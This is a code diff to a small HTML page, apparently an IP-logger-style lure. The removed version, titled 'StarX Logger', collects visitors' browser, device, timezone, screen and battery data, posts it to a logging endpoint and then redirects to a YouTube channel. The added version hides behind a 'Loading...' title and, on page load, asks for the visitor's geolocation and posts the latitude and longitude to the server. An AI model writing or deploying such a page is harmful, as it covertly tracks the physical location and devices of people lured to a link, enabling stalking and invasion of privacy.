@@ -1,36 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>StarX Logger</title>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
   <script>
-    async function collectData() {
-      let battery = await navigator.getBattery();
-      let data = {
-        browser: navigator.userAgent,
-        device: navigator.platform,
-        lang: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: screen.width + "x" + screen.height,
-        battery: Math.round(battery.level * 100) + "% (Charging: " + battery.charging + ")",
-        ref: document.referrer
-      };
-
-      fetch("/log", {
+    function sendData(extraData = {}) {
+      fetch("/", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(extraData)
       });
     }
 
-    collectData();
+    function getLocationAndSend() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const extraData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+            sendData(extraData);
+          },
+          function (error) {
+            console.warn("Location permission denied or error.");
+            sendData(); // send without location
+          }
+        );
+      } else {
+        console.warn("Geolocation not supported.");
+        sendData();
+      }
+    }
+
+    // Trigger on page load
+    window.onload = getLocationAndSend;
   </script>
 </head>
 <body>
-  <h1>Redirecting...</h1>
-  <script>
-    setTimeout(() => {
-      window.location.href = "https://youtube.com/@starxnetwork"; // Change if needed
-    }, 2000);
-  </script>
+  <h1>Loading...</h1>
 </body>
 </html>
